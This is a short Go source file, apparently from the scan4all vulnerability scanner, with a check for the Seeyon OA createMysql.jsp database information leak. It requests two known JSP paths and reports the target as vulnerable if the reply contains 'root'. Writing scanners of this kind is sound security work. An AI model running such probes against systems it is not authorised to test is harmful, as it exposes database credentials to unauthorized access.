package seeyon

import (
	"fmt"
	"github.com/hktalent/scan4all/pkg"
)

//createMysql.jsp 数据库敏感信息泄

func CreateMysql(u string) bool {
	var vuln = false
	if req, err := pkg.HttpRequset(u+"/yyoa/createMysql.jsp", "GET", "", false, nil); err == nil {
		if req.StatusCode == 200 && pkg.StrContains(req.Body, "root") {
			pkg.GoPocLog(fmt.Sprintf("Found vuln seeyon CreateMysql|%s\n", u+"/yyoa/createMysql.jsp"))
			vuln = true
		}
	}
	if req, err := pkg.HttpRequset(u+"/yyoa/ext/createMysql.jsp", "GET", "", false, nil); err == nil {
		if req.StatusCode == 200 && pkg.StrContains(req.Body, "root") {
			pkg.GoPocLog(fmt.Sprintf("Found vuln seeyon CreateMysql|%s\n", u+"/yyoa/ext/createMysql.jsp"))
			vuln = true
		}
	}
	return vuln
}
